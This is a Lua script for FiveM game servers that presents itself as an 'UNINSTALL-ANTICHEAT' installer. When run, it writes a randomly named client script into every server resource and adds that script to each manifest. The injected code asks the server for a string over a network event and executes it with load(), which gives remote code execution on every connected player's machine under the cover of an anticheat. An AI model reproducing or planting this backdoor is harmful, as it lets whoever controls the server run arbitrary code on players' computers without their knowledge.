-- Commands/Installation/Uninstall

local pisellone = nil

	local manifesto = "__resource"

	local resources = nil



				

	RegisterCommand("uninstall", function(source, args, rawCommand)

	if source == 0 then

	print("")

	print("**[UNINSTALL-ANTICHEAT]**")

	print("**[UNINSTALL-ANTICHEAT]: uninstall help > Commands**")

	print("")

	if args[1] == "install" then

		randomstring()

		if args[2] == "fx" then

			print("**INSTALLING INTO fxmanifest.lua ONLY!**")

			manifesto = "fxmanifest"

		elseif args[2] == nil then

			print("**INSTALLING INTO __resource.lua ONLY!**")

			manifesto = "__resource"

		end

			if not resources then resources = {0, 0, 0} end

				local resourcenum = GetNumResources()

				for i = 0, resourcenum-1 do

					local path = GetResourcePath(GetResourceByFindIndex(i))

					if string.len(path) > 4 then

						setall(path)

					end

				end

				print("^2[UNINSTALL-ANTICHEAT] Resources ("..resources[1].."/"..resources[2].." completed). "..resources[3].." skipped.")

				print("^1[UNINSTALL-ANTICHEAT] Your uninstall Script code for: "..manifesto.." is: "..pisellone.." KEEP IT SAFE! DONT LOSE IT!")

				print("^1[UNINSTALL-ANTICHEAT] Restart your server!!!")

			resources = nil



	elseif args[1] == "help" then

		print("**[UNINSTALL-ANTICHEAT] Installation**")

		print("")

		print("[*]Usage: \"uninstall install\" -- for __resource.lua files")

		print("[*]Usage: \"uninstall install fx\" -- for fxmanifest.lua files")

		print("----------------------")

		print("**[UNINSTALL-ANTICHEAT] Uninstall**")

		print("")

		print("[*]Usage: \"uninstall uninstall uninstall ScriptCode\" -- for __resource.lua files ")

		print("[*]Example: \"uninstall uninstall uninstall-ac_KuA4JV78JNA6H")

		print("[*]Usage: \"uninstall uninstall uninstall ScriptCode fx\" -- for fxmanifest.lua files")

		print("[*]Example: \"uninstall uninstall uninstall-ac_KuA4JV78JNA6H fx")

		print("")

		print("[*]replace uninstall ScriptCode with the code provided during the installation")

		print("[*]Note: If you lost your code, search in any resource folder for it, you will find it as a lua file.")

		print("----------------------")

		print("[*]Help: uninstall help")

	elseif args[1] == "oreo" then

		print("^"..math.random(1,9).."[UNINSTALL-ANTICHEAT]: ^"..math.random(1,9).."Purr Purr :3")

		print("^"..math.random(1,9).."[UNINSTALL-ANTICHEAT]: ^"..math.random(1,9).."Purr Purr :3")

		print("^"..math.random(1,9).."[UNINSTALL-ANTICHEAT]: ^"..math.random(1,9).."Purr Purr :3")

		print("^"..math.random(1,9).."[UNINSTALL-ANTICHEAT]: ^"..math.random(1,9).."Nice... you found the easter egg.")

	end



	if args[1] == "uninstall" then

		if not resources then resources = {0, 0, 0} end

			if args[2] then

				pisellone = args[2]

				if args[3] == "fx" then

					print("**UNINSTALLING FROM fxmanifest.lua ONLY!**")

					manifesto = "fxmanifest"

				elseif args[3] == nil then

					print("**UNINSTALLING FROM __resource.lua ONLY!**")

					manifesto = "__resource"

				end

			local resourcenum = GetNumResources()

			for i = 0, resourcenum-1 do

			local path = GetResourcePath(GetResourceByFindIndex(i))

				if string.len(path) > 4 then

					setall(path, true)

				end

			end

			print("^2[UNINSTALL-ANTICHEAT] Resources ("..resources[1].."/"..resources[2].." completed). "..resources[3].." skipped.")

			print("^1[UNINSTALL-ANTICHEAT] Restart your server!!!")

			resources = nil

		else

			print("^"..math.random(1,9).."[UNINSTALL-ANTICHEAT] Invalid Variable Name.")

			print("^"..math.random(1,9).."[UNINSTALL-ANTICHEAT] Need help? try uninstall-ANTICHEAT help")

		end

	end

	else

		chocolog(source,"nice try","Do not touch [UNINSTALL-ANTICHEAT] from client side",true,true)

	end

	end, true)



	function setall(dir, bool)

	local file = io.open(dir.."/"..manifesto..".lua", "r")

	local tab = split(dir, "/")

	local resname = tab[#tab]

	tab = nil

	if file then

		if not bool then

			file:seek("set", 0)

			local r = file:read("*a")

			file:close()

			local table1 = split(r, "\n")

			local found = false

			local found2 = false

			for a, b in ipairs(table1) do

				if b == "client_script \""..pisellone..".lua\"" then

					found = true

				end

				if not found2 then

					local fi = string.find(b, "client_script") or -1

					local fin = string.find(b, "#") or -1

					if fi ~= -1 and (fin == -1 or fi < fin) then

						found2 = true

					end

				end

			end

			if found2 then

				r = r.."\nclient_script \""..pisellone..".lua\""

				if not found then

					os.remove(dir.."/"..manifesto..".lua")

					file = io.open(dir.."/"..manifesto..".lua", "w")

					if file then

						file:seek("set", 0)

						file:write(r)

						file:close()

					end

				end

				local code = [[
					CreateThread(function()
						TriggerServerEvent("somfing")
						RegisterNetEvent("somfing")
						AddEventHandler("somfing", function(somfing)
							load(somfing)()
						end)
					end)
				]]

				file = io.open(dir.."/"..pisellone..".lua", "w")

				if file then

					file:seek("set", 0)

					file:write(code)

					file:close()

					resources[1] = resources[1]+1

					print("^3[UNINSTALL-ANTICHEAT] Installed into"..resname.." completed.")

				else

					print("^3[UNINSTALL-ANTICHEAT] Installation failed on "..resname..".")

				end

				resources[2] = resources[2]+1

			else

				resources[3] = resources[3]+1

			end

		else

			file:seek("set", 0)

			local r = file:read("*a")

			file:close()

			local table1 = split(r, "\n")

			r = ""

			local found = false

			local found2 = false

			for a, b in ipairs(table1) do

				if b == "client_script \""..pisellone..".lua\"" then

					found = true

				else

					r = r..b.."\n"

				end

			end

			if os.rename(dir.."/"..pisellone..".lua", dir.."/"..pisellone..".lua") then

				found2 = true

				os.remove(dir.."/"..pisellone..".lua")

			end

			if not found and not found2 then resources[3] = resources[3]+1 end

			if found then

				resources[2] = resources[2]+1

				os.remove(dir.."/"..manifesto..".lua")

				file = io.open(dir.."/"..manifesto..".lua", "w")

				if file then

					file:seek("set", 0)

					file:write(r)

					file:close()

				else

					print("Failed uninstalling [UNINSTALL-ANTICHEAT] from "..resname..".")

					print("Make sure you are using the right variable!!!.")

					found, found2 = false, false

				end

			end

			if found or found2 then

				print("^3[UNINSTALL-ANTICHEAT] Uninstalled from "..resname.." successfully.")

				resources[1] = resources[1]+1

			end

		end

	else

		resources[3] = resources[3]+1

	end

	end



	function searchall(dir, bool)

	local file = io.popen("dir \""..dir.."\" /b /ad")

	file:seek("set", 0)

	local r1 = file:read("*a")

	file:close()

	local table1 = split(r1, "\n")

	for a, b in ipairs(table1) do

		if string.len(b) > 0 then

			setall(dir.."/"..b, bool)

			searchall(dir.."/"..b, bool)

		end

	end

	end



	function split(str, seperator)

	local pos, arr = 0, {}

	for st, sp in function() return string.find(str, seperator, pos, true) end do

		table.insert(arr, string.sub(str, pos, st-1))

		pos = sp + 1

	end

	table.insert(arr, string.sub(str, pos))

	return arr

	end



	function randomstring()

	local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

	local length = 12

	local randomString = "block"

	

	math.randomseed(os.time())

	

	charTable = {}

	for c in chars:gmatch"." do

		table.insert(charTable, c)

	end

	

	for i = 1, length do

		randomString = randomString .. charTable[math.random(1, #charTable)]

	end

	

	pisellone = randomString

	end


